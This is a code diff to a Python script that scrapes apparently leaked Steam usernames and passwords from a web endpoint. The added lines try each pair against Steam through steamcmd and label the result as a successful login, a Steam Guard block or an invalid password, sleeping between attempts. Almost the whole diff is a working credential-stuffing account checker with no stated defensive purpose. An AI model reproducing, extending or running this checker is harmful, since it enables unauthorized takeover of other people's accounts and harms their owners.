@@ -3,6 +3,8 @@ import re
 import sys
 import subprocess
 from bs4 import BeautifulSoup
+import time
+
 ########################## getting slug name from server code ##################################
 ENDPOINT = "https://steam-scraper-six.vercel.app/search"
 
@@ -54,8 +56,46 @@ text = soup.get_text(separator="\n")
 usernames = re.findall(r'USER : (\S+)',text)
 passwords = re.findall(r'PASS : (\S+)',text)
 
+import subprocess
 
-for username,password in zip( usernames,passwords ):
-    print("\nUsername: ",username,"\nPassword: ",password)
+for username, password in zip(usernames, passwords):
+    print("\nUsername:", username)
+    print("Password:", password)
+
+
+
+    try:
+        steam_process = subprocess.Popen(
+        ["steamcmd", "+login", username, password, "+quit"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,   # merge stderr into stdout
+        stdin=subprocess.DEVNULL,
+        text=True,
+        bufsize=1,             # line-buffered
+        )
+
+
+        output, _ = steam_process.communicate(timeout=30)
+
+        if "Waiting for user info...OK" in output:
+            print(f"[SUCCESS] {username}")
+
+        elif "Steam Guard" in output:
+            print(f"[STEAM GUARD] {username}")
+
+        elif "Invalid Password" in output :
+            print(f"[INVALID PASSWORD] {username}")
+
+        else:
+            print(f"[UNKNOWN RESULT] {username} {output}")
+    
+    except subprocess.TimeoutExpired:
+        steam_process.kill()
+        print("Login process timed out.")
+
+    except Exception as e:
+        print(f"{username} : {e}")
+
+    time.sleep(3)   
 
 #################################################################################################
